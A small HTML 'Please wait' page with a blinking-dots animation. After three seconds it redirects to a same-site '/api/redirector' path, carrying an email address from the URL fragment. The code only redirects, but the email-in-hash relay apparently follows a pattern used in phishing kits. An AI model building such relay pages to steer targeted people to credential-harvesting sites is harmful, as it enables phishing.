<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Please wait...</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      background-color: #f4f4f4;
    }
    #message {
      font-size: 1.5em;
      margin-bottom: 20px;
    }
    #dots span {
      display: inline-block;
      animation: blink 1s infinite;
      margin: 0 2px;
    }
    #dots span:nth-child(2) { animation-delay: 0.2s; }
    #dots span:nth-child(3) { animation-delay: 0.4s; }

    @keyframes blink {
      0%, 50%, 100% { opacity: 0; }
      25%, 75% { opacity: 1; }
    }
  </style>
</head>
<body>
  <div id="message">
    Please wait<span id="dots"><span>.</span><span>.</span><span>.</span></span>
  </div>

  <script>
    window.addEventListener("DOMContentLoaded", () => {
      const email = window.location.hash.substring(1); // preserve hash for redirect
      const redirectorUrl = "/api/redirector";
      const target = email ? `${redirectorUrl}#${email}` : redirectorUrl;

      // Delay to show animation
      setTimeout(() => {
        window.location.href = target;
      }, 3000);
    });
  </script>
</body>
</html>
